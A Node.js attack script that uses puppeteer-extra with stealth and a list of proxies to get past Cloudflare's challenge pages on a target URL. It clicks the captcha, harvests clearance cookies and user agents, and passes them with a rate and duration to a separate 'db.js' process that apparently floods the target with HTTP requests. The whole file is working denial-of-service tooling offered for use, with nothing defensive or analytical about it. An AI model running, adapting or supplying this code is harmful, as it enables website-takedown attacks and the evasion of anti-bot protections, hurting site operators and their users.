const fs = require("fs");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const async = require("async");

const COOKIES_MAX_RETRIES = 1;
const errorHandler = error => {
    console.log(error);
};

process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

Array.prototype.remove = function (item) {
    const index = this.indexOf(item);
    if (index !== -1) {
        this.splice(index, 1);
    }
    return item;
};

const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);
if (process.argv.length < 6) {
    console.error("node browser target theard proxy rate time");
    process.exit(1);
}
const targetURL = process.argv[2];
const threads = process.argv[3];
const proxyFile = process.argv[4];
const rates = process.argv[5];
const duration = process.argv[6];

const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
const { spawn } = require("child_process");

const readProxiesFromFile = (filePath) => {
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        const proxies = data.trim().split(/\r?\n/);
        return proxies;
    } catch (error) {
        console.error('Error reading proxies file:', error);
        return [];
    }
};

const proxies = readProxiesFromFile(proxyFile);
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188",
];

const colors = {
    COLOR_RED: "\x1b[31m",
    COLOR_GREEN: "\x1b[32m",
    COLOR_YELLOW: "\x1b[33m",
    cc: "\x1b[38;5;57m",
    COLOR_RESET: "\x1b[0m"
};

function colored(colorCode, text) {
    console.log(colorCode + text + colors.COLOR_RESET);
};

async function detectChallenge(browser, page, browserProxy) {
    const title = await page.title();
    const content = await page.content();
  
    if (title === "Attention Required! | Cloudflare") {
        throw new Error("Proxy blocked");
    }
  
    if (content.includes("challenge-platform")) {
        colored(colors.COLOR_YELLOW, "START BYPASS PROXY: " + browserProxy);
    
        try {
            await sleep(12);
            const captchaContainer = await page.$("iframe[src*='challenges']");
            await captchaContainer.click({ offset: { x: 20, y: 20 } });
        } catch (error) {
            // Handle any errors
        } finally {
            await sleep(6);
            return;
        }
    }
  
    colored(colors.COLOR_YELLOW, "No challenge detected " + browserProxy);
    await sleep(10);
}

async function openBrowser(targetURL, browserProxy) {
    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
    const options = {
        headless: "new",
        ignoreHTTPSErrors: true,
        args: [
            "--proxy-server=http://" + browserProxy,
            "--no-sandbox",
            "--no-first-run",
            "--ignore-certificate-errors",
            "--disable-extensions",
            "--test-type",
            "--user-agent=" + userAgent
        ]
    };

    let browser;
    try {
        browser = await puppeteer.launch(options);
    } catch (error) {
        console.error('Error launching browser');
        return;
    }
  
    try {
        colored(colors.cc, "RUN PROXY: " + browserProxy);
        const [page] = await browser.pages();
        const client = page._client();
    
        page.on("framenavigated", (frame) => {
            if (frame.url().includes("challenges.cloudflare.com")) {
                client.send("Target.detachFromTarget", { targetId: frame._id });
            }
        });
    
        page.setDefaultNavigationTimeout(60 * 1000);
        await page.goto(targetURL, { waitUntil: "domcontentloaded" });
        await detectChallenge(browser, page, browserProxy);
        const title = await page.title();
        const cookies = await page.cookies(targetURL);
    
        return {
            title: title,
            browserProxy: browserProxy,
            cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
            userAgent: userAgent
        };
    } catch (error) {
        console.error('Error while browsing');
    } finally {
        colored(colors.COLOR_RED, "ERROR SOLVING PROXY: " + browserProxy);
        await browser.close();
    }
}

async function startThread(targetURL, browserProxy, task, done, retries = 0) {
    if (retries === COOKIES_MAX_RETRIES) {
        const currentTask = queue.length();
        done(null, { task, currentTask });
    } else {
        try {
            const response = await openBrowser(targetURL, browserProxy);
            if (response) {
                if (response.title === "Just a moment...") {
                    colored(colors.COLOR_RED, "RUN PROXY: " + browserProxy + " - Clicking captcha failed");
                    await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
                    return;
                }
                
                const cookies = " pageTitle: " + response.title + "\n proxyAddress: " + response.browserProxy + "\n userAgent:" + response.userAgent + "\n cookies: " + response.cookies + "\n }";
                colored(colors.COLOR_GREEN, "{ " + "\n" + cookies);
                spawn("node", [
                    "db.js",
                    targetURL,
                    duration,
                    rates,
                    "1",
                    response.userAgent,
                    response.cookies,
                    'http'
                ]);
            }
            await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
        } catch (error) {
            colored(colors.COLOR_RED, error.message);
            await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
        }
    }
}


const queue = async.queue(function (task, done) {
    startThread(targetURL, task.browserProxy, task, done);
}, threads);

async function main() {
    for (let i = 0; i < proxies.length; i++) {
        const browserProxy = proxies[i];
        queue.push({ browserProxy: browserProxy });
    }

    await sleep(duration);
    queue.kill();
    process.exit();
}

main();
